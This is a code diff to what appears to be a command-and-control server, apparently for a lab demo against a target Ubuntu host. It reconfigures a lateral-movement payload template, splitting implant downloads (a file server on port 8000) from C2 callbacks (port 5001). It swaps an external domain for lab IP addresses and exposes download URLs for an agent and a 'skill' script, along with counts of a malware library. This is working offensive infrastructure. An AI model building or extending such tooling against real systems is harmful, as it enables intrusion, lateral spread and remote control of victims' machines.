@@ -28,8 +28,9 @@ HOST = "0.0.0.0"
 MAX_HISTORY_ITEMS = 1000
 MAX_RESULT_SIZE = 10 * 1024 * 1024  # 10MB
 
-# C2 URL hardcoded for demo — reachable from the target Ubuntu machine (10.5.9.40)
-C2_LATERAL_URL = "http://10.5.9.41:5001"
+# URLs hardcoded for demo — reachable from the target Ubuntu machine (10.5.9.40)
+C2_LATERAL_URL  = "http://10.5.9.41:5001"   # C2 callbacks (app.py)
+FILE_SERVER_URL = "http://10.5.9.41:8000"   # python3 -m http.server (serves downloads/)
 
 # Base directory — always relative to this file, regardless of CWD
 _BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -702,15 +703,16 @@ def fallback_code(task_type, reason):
         code = fallback_payloads[task_type]
 
         if task_type == "lateral":
+            # Downloads (:8000) → FILE_SERVER_URL   |   C2 callbacks (:5001) → C2_LATERAL_URL
             code = (
                 code
-                .replace("http://iotstdpool.com:8000", C2_LATERAL_URL)
+                .replace("http://iotstdpool.com:8000", FILE_SERVER_URL)
                 .replace("http://iotstdpool.com:5001", C2_LATERAL_URL)
-                .replace("iotstdpool.com:8000",        "10.5.9.41:5001")
+                .replace("iotstdpool.com:8000",        "10.5.9.41:8000")
                 .replace("iotstdpool.com:5001",        "10.5.9.41:5001")
                 .replace("iotstdpool.com",             "10.5.9.41")
             )
-            logger.info(f"[LATERAL] payload templated → C2 = {C2_LATERAL_URL}")
+            logger.info(f"[LATERAL] payload templated → downloads={FILE_SERVER_URL} C2={C2_LATERAL_URL}")
 
         return code
 
@@ -3951,7 +3953,8 @@ def health_check():
             "malware_library_scripts": len(malware_library.get("scripts", [])),
             "autorecon_sessions": len(autorecon_sessions),
             "lateral_payload_c2": C2_LATERAL_URL,
-            "agent_download_url": f"{C2_LATERAL_URL}/downloads/advanced_agent.py",
+            "agent_download_url": f"{FILE_SERVER_URL}/advanced_agent.py",
+            "skill_download_url": f"{FILE_SERVER_URL}/neural_nexus_skill.py",
         })
     except Exception as e:
         logger.error(f"Health check failed: {str(e)}")
